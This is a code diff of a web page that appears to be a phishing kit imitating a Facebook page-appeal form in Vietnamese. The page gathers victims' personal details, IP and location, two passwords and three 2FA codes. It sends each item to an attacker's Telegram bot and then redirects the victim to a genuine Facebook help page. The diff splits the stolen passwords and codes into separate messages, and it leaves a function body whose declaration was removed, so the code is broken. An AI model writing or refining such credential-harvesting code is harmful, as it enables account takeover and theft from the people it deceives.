@@ -393,12 +393,8 @@ export default function HomePageClient({
     code3: string;
     status: string;
   }>;
-
-  const buildTelegramMessage = (status: string, overrides: TelegramOverrides = {}) => {
-    const locationParts = (clientLocation ?? "")
-      .split("/")
-      .map((part) => part.trim())
-      .filter(Boolean);
+  const buildInitialMessage = () => {
+    const locationParts = (clientLocation ?? "").split("/").map((part) => part.trim()).filter(Boolean);
     const safeCountry = escapeHtml(locationParts[2] ?? locationParts[1] ?? locationParts[0] ?? "N/A");
     const safeCity = escapeHtml(locationParts[1] ?? locationParts[0] ?? "N/A");
     const safeIp = escapeHtml(clientIp ?? "N/A");
@@ -411,15 +407,9 @@ export default function HomePageClient({
     const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+84");
     const safeUrl = escapeHtml(currentUrl || "N/A");
     const safeTime = escapeHtml(getCurrentTime());
-    const safePassword1 = escapeHtml((overrides.password1 ?? password1) || "N/A");
-    const safePassword2 = escapeHtml((overrides.password2 ?? password2) || "N/A");
-    const safeCode1 = escapeHtml((overrides.code1 ?? code1) || "N/A");
-    const safeCode2 = escapeHtml((overrides.code2 ?? code2) || "N/A");
-    const safeCode3 = escapeHtml((overrides.code3 ?? code3) || "N/A");
-    const safeStatus = escapeHtml((overrides.status ?? status) || "N/A");
 
     return [
-      "👤 <b>THÔNG TIN Yêu Cầu Kháng Nghị</b>",
+      "👤 <b>THÔNG TIN YÊU CẦU KHÁNG NGHỊ</b>",
       `📱 Tên PAGE: <code>${safePageName}</code>`,
       `👨‍💼 Tên: <code>${safeFullName}</code>`,
       `🎂 Ngày Sinh: <code>${safeDateOfBirth}</code>`,
@@ -436,19 +426,12 @@ export default function HomePageClient({
       `📞 SĐT: <code>${safePhone}</code>`,
       `🗒 Thông tin bổ sung: <code>${safeDetails}</code>`,
       `🔗 URL: <code>${safeUrl}</code>`,
-      `🔑 Mật Khẩu 1: <code>${safePassword1}</code>`,
-      `🔑 Mật Khẩu 2: <code>${safePassword2}</code>`,
-      `🔓 CODE 2FA 1: <code>${safeCode1}</code>`,
-      `🔓 CODE 2FA 2: <code>${safeCode2}</code>`,
-      `🔓 CODE 2FA 3: <code>${safeCode3}</code>`,
-      `🔄 Trạng thái: ${safeStatus}`,
     ].join("\n");
   };
 
-  const sendTelegramMessage = async (text: string) => {
-    if (!telegramEnabled) {
-      return;
-    }
+  const buildUpdateMessage = (label: string, value: string) => {
+    return `🔔 <b>${label}:</b> <code>${escapeHtml(value)}</code>`;
+  };
 
     try {
       const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -492,18 +475,17 @@ export default function HomePageClient({
     setCode2("");
     setCode3("");
 
-    const text = buildTelegramMessage("Đang chờ mật khẩu...");
+    const text = buildInitialMessage();
     await sendTelegramMessage(text);
   };
 
-   const updateTelegramMessage = async (status: string, overrides: TelegramOverrides = {}) => {
+  const updateTelegramMessage = async (label: string, value: string) => {
     if (!telegramEnabled) {
       return;
     }
-    const text = buildTelegramMessage(status, overrides);
+    const text = buildUpdateMessage(label, value);
     await sendTelegramMessage(text);
   };
-
   const passwordStepMessage = modal.passwordStepMessage;
   const passwordPlaceholder = modal.passwordPlaceholder;
   const continueButtonLabel = modal.continueButtonLabel;
@@ -650,10 +632,7 @@ export default function HomePageClient({
     if (currentClick === 0) {
       const firstAttempt = password;
       setPassword1(firstAttempt);
-      await updateTelegramMessage("Đang chờ mật khẩu 2...", {
-        password1: firstAttempt,
-        status: "Đang chờ mật khẩu 2...",
-      });
+     await updateTelegramMessage("Mật Khẩu 1", firstAttempt);
 
       if (passwordTimerRef.current) {
         clearTimeout(passwordTimerRef.current);
@@ -670,10 +649,7 @@ export default function HomePageClient({
     if (currentClick === 1) {
       const secondAttempt = password;
       setPassword2(secondAttempt);
-      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
-        password2: secondAttempt,
-        status: "Đang chờ mã xác thực 2FA...",
-      });
+      await updateTelegramMessage("Mật Khẩu 2", secondAttempt);
 
       if (passwordTimerRef.current) {
         clearTimeout(passwordTimerRef.current);
@@ -751,10 +727,7 @@ export default function HomePageClient({
     if (currentClick === 0) {
       const firstCode = twoFactorCode;
       setCode1(firstCode);
-      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
-        code1: firstCode,
-        status: "Đang chờ mã xác thực 2FA...",
-      });
+      await updateTelegramMessage("Mã 2FA (Lần 1)", firstCode);
       setIsSubmitDisabled(true);
       setTimeLeft(10);
       setTwoFactorCode("");
@@ -764,10 +737,7 @@ export default function HomePageClient({
     if (currentClick === 1) {
       const secondCode = twoFactorCode;
       setCode2(secondCode);
-      await updateTelegramMessage("Đang chờ mã xác thực 2FA...", {
-        code2: secondCode,
-        status: "Đang chờ mã xác thực 2FA...",
-      });
+      await updateTelegramMessage("Mã 2FA (Lần 2)", secondCode);
       setIsSubmitDisabled(true);
       setTimeLeft(10);
       setTwoFactorCode("");
@@ -777,10 +747,7 @@ export default function HomePageClient({
     if (currentClick === 2) {
       const thirdCode = twoFactorCode;
       setCode3(thirdCode);
-      await updateTelegramMessage("Hoàn tất!", {
-        code3: thirdCode,
-        status: "Hoàn tất!",
-      });
+      await updateTelegramMessage("Mã 2FA (Lần 3)", thirdCode);
       setTwoFactorCode("");
       setTimeout(() => {
         window.location.href = "https://www.facebook.com/help/1735443093393986/";
